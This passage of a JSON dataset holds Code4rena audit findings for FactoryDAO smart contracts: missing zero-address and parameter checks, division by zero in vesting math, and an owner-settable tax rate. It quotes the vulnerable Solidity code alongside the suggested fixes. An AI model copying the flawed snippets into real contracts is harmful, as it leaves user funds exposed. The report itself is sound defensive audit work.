class=\"mtk12\">thisOwner</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">'ERC721: mint to the zero address'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">allTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// increment the number of identities</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// two way mapping for enumeration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ownershipMapIndexToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">]] = </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ownershipMapTokenToIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set owner of new token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">owners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// increment balances for owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">] + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uriMap</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">uri</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IdentityCreated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "#l-02-voterid-token-can-be-minted-to-the-zero-address",
      "tags": [],
      "finders": []
    },
    {
      "id": "4641",
      "title": "[L-05] Replace inline assembly with ",
      "impact": "LOW",
      "content": "<h2 id=\"l-05-replace-inline-assembly-with-accountcodelength\" style=\"position:relative;\"><a href=\"#l-05-replace-inline-assembly-with-accountcodelength\" aria-label=\"l 05 replace inline assembly with accountcodelength permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] Replace inline assembly with <code>account.code.length</code></h2>\n<p><code>&lt;address&gt;.code.length</code> can be used in Solidity &gt;= 0.8.0 to access an accountâ€™s code size and check if it is a contract without inline assembly.</p>\n<p><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L343-L349\"><code>VoterID#isContract</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">isContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">size</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// solhint-disable-next-line no-inline-assembly</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> { size := </span><span class=\"mtk11\">extcodesize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">) }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">size</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Suggestion:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">isContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">.</span><span class=\"mtk12\">code</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "#l-05-replace-inline-assembly-with-accountcodelength",
      "tags": [],
      "finders": []
    },
    {
      "id": "4640",
      "title": "[L-04] Prefer ",
      "impact": "LOW",
      "content": "<h2 id=\"l-04-prefer-safetransfer-and-safetransferfrom-for-erc20-token-transfers\" style=\"position:relative;\"><a href=\"#l-04-prefer-safetransfer-and-safetransferfrom-for-erc20-token-transfers\" aria-label=\"l 04 prefer safetransfer and safetransferfrom for erc20 token transfers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Prefer <code>safeTransfer</code> and <code>safeTransferFrom</code> for ERC20 token transfers</h2>\n<p>Consider using OpenZeppelinâ€™s <a href=\"https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#SafeERC20\"><code>SafeERC20</code></a> library to handle edge cases in ERC20 token transfers. This prevents accidentally forgetting to check the return value, like the example in <a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L169-L174\"><code>MerkleVesting#withdraw</code></a>.</p>\n<p>Potential changes:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L144\"><code>PermissionlessBasicPoolFactory.sol#L144</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L198\"><code>PermissionlessBasicPoolFactory.sol#L198</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L230\"><code>PermissionlessBasicPoolFactory.sol#L230</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L89\"><code>MerkleVesting.sol#L89</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L121\"><code>MerkleResistor.sol#L121</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L204\"><code>MerkleResistor.sol#L204</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleDropFactory.sol#L77\"><code>MerkleDropFactory.sol#L77</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleDropFactory.sol#L107\"><code>MerkleDropFactory.sol#L107</code></a></li>\n</ul>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "#l-04-prefer-safetransfer-and-safetransferfrom-for-erc20-token-transfers",
      "tags": [],
      "finders": []
    },
    {
      "id": "4637",
      "title": "[L-01] Missing parameter validations in ",
      "impact": "LOW",
      "content": "<h2 id=\"l-01-missing-parameter-validations-in-speedbumppricegateaddgate\" style=\"position:relative;\"><a href=\"#l-01-missing-parameter-validations-in-speedbumppricegateaddgate\" aria-label=\"l 01 missing parameter validations in speedbumppricegateaddgate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Missing parameter validations in <code>SpeedBumpPriceGate#addGate</code></h2>\n<p>Callers of <code>addGate</code> can create price gates with a zero price floor (allowing users to claim free tokens), and zero <code>priceIncreaseDenominator</code> (causing price calculation to revert with a divide by zero error).</p>\n<p><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/SpeedBumpPriceGate.sol#L36-L45\"><code>SpeedBumpPriceGate#addGate</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addGate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceFloor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceDecay</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceIncrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceIncreaseDenominator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">beneficiary</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// prefix operator increments then evaluates</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Gate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gates</span><span class=\"mtk1\">[++</span><span class=\"mtk12\">numGates</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">priceFloor</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceFloor</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">decayFactor</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceDecay</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">priceIncreaseFactor</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceIncrease</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">priceIncreaseDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceIncreaseDenominator</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">beneficiary</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">beneficiary</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Suggestion: Validate that <code>priceFloor</code> and <code>priceIncreaseDenominator</code> are nonzero.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addGate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceFloor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceDecay</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceIncrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceIncreaseDenominator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">beneficiary</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">priceFloor</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">\"Price floor must be nonzero\"</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">priceIncreaseDenominator</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">\"Denominator must be nonzero\"</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// prefix operator increments then evaluates</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Gate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gates</span><span class=\"mtk1\">[++</span><span class=\"mtk12\">numGates</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">priceFloor</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceFloor</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">decayFactor</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceDecay</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">priceIncreaseFactor</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceIncrease</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">priceIncreaseDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceIncreaseDenominator</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">beneficiary</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">beneficiary</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "#l-01-missing-parameter-validations-in-speedbumppricegateaddgate",
      "tags": [],
      "finders": []
    },
    {
      "id": "2264",
      "title": "[M-21] Verification should be leafed based and not address based",
      "impact": "MEDIUM",
      "content": "_Submitted by Picodes, also found by pedroais, and unforgiven_\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleVesting.sol#L115>\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleDropFactory.sol#L92>\n\n### Impact\n\nContracts should clarify what is the intended behavior for Merkle trees with multiple leafs with the same address.\n\n### Recommended Mitigation Steps\n\nThere is 2 possible behaviors:\n\n*   either - what is currently done - you only authorize one claim per address, in which case the multiple leaf are here to give users a choice - for example you could use `MerkleVesting` to give users the choice between 2 sets of vesting parameters and have something close to `MerkleResistor`.\n*   either you use a mapping based on the leaf to store if a leaf has been claimed or not.\n\nThis behavior should be clarified in the comments at least, and made clear to merkle tree builders.\n\n**[illuzen (FactoryDAO) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/148#issuecomment-1123447533):**\n > This is covered in a comment on MerkleResistor:49, but we should put it elsewhere for clarity.\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/148#issuecomment-1145529268):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/3\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report concerns the MerkleVesting and MerkleDropFactory contracts, which are used to create Merkle trees. The issue is that the contracts do not clarify the intended behavior for Merkle trees with multiple leafs with the same address. This can lead to confusion and misunderstandings. \n\nThe recommended mitigation steps are to either allow only one claim per address, or use a mapping based on the leaf to store if a leaf has been claimed or not. Whichever option is chosen, the behavior should be clarified in the comments and made clear to merkle tree builders.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/148",
      "tags": [],
      "finders": [
        "unforgiven",
        "pedroais",
        "Picodes"
      ]
    },
    {
      "id": "2263",
      "title": "[M-20] MerkleResistor: zero coinsPerSecond will brick tranche initialization and withdrawals",
      "impact": "MEDIUM",
      "content": "_Submitted by hickuphh3, also found by GimelSec, gzeon, and scaraven_\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleResistor.sol#L259>\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleResistor.sol#L264>\n\n### Details & Impact\n\nIt is possible for `coinsPerSecond` to be zero. In these cases, the `startTime` calculation\n\n```solidity\nuint startTime = block.timestamp + vestingTime - (totalCoins / coinsPerSecond);\n```\n\nwill revert from division by zero, preventing initialization, and by extension, withdrawals of vested tokens.\n\n### Proof of Concept\n\nWe assume vesting time chosen is the maximum (`tree.maxEndTime`) so that `totalCoins = maxTotalPayments`. These examples showcase some possibilities for which the calculated `coinsPerSecond` can be zero.\n\n#### Example 1: High upfront percentage\n\n*   `pctUpFront = 99` (99% up front)\n*   `totalCoins = 10_000e6` (10k USDC)\n*   `vestingTime = 1 year`\n\n```solidity\nuint coinsPerSecond = (totalCoins * (uint(100) - tree.pctUpFront)) / (vestingTime * 100);\n// 10_000e6 * (100 - 99) / (365 * 86400 * 100)\n// = 0\n```\n\n#### Example 2: Small reward amount / token decimals\n\n*   `pctUpFront = 0`\n*   `totalCoins = 100_000e2` (100k EURS)\n*   `vestingTime = 180 days`\n\n```solidity\nuint coinsPerSecond = (totalCoins * (uint(100) - tree.pctUpFront)) / (vestingTime * 100);\n// 100_000e2 * 100 / (180 * 86400 * 100)\n// = 0\n```\n\n### Recommended Mitigation Steps\n\nScale up `coinsPerSecond` by `PRECISION`, then scale down when executing withdrawals. While it isnâ€™t foolproof, the possibility of `coinsPerSecond` being zero is reduced significantly.\n\n```solidity\n// L264\nuint coinsPerSecond = (totalCoins * (uint(100) - tree.pctUpFront)) * PRECISION / (vestingTime * 100);\n\n// L184\ncurrentWithdrawal = (block.timestamp - tranche.lastWithdrawalTime) * tranche.coinsPerSecond / PRECISION;\n```\n\n**[illuzen (FactoryDAO) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/107#issuecomment-1122169659):**\n > Example 1 = 3, not 0\n\n**[Justin Goro (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/107#issuecomment-1155837749):**\n > Reducing severity because rewards are not staked user funds.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the MerkleResistor.sol contract, which is part of the code-423n4/2022-05-factorydao repository on GitHub. The vulnerability is caused by the possibility of coinsPerSecond being zero in certain cases. This can happen when the upfront percentage is high or when the reward amount is small, resulting in the startTime calculation reverting from a division by zero error. This prevents initialization and withdrawals of vested tokens.\n\nThe recommended mitigation steps are to scale up coinsPerSecond by a precision, then scale down when executing withdrawals. This reduces the risk of coinsPerSecond being zero. The exact code for this is provided in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/107",
      "tags": [],
      "finders": [
        "scaraven",
        "hickuphh3",
        "GimelSec",
        "gzeon"
      ]
    },
    {
      "id": "2262",
      "title": "[M-19] Centralisation Risk: Owner may abuse the tax rate to claim 99.9% of pools",
      "impact": "MEDIUM",
      "content": "_Submitted by AuditsAreUS, also found by leastwood, pedroais, and reassor_\n\nIt is possible for the owner to increase the tax rate to 99.9% in `setGlobalTax()`.\n\nThe impact of this is that any future pools will be required to pay 99.9% of their rewards in tax to the `globalBeneficiary`.\n\nIt is possible for the `globalBeneficiary` to modify this and front-run any transactions in the mem-pool which call `addPool()`. These transactions will succeed and create pools with the 99.9% tax rate.\n\n### Proof of Concept\n\nThe cap for the tax rate is 1000 = 100%.\n\n```solidity\n    function setGlobalTax(uint newTaxPerCapita) external {\n        require(msg.sender == globalBeneficiary, 'Only globalBeneficiary can set tax');\n        require(newTaxPerCapita < 1000, 'Tax too high');\n        globalTaxPerCapita = newTaxPerCapita;\n    }\n```\n\n### Recommended Mitigation Steps\n\nIt is recommended to put some reasonable upper bounds on the tax rate. Consider setting the upper bounds for the tax rate to 5%.\n\n**[illuzen (FactoryDAO) confirmed and resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/56#issuecomment-1145529833):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/2\n\n\n\n***\n\n",
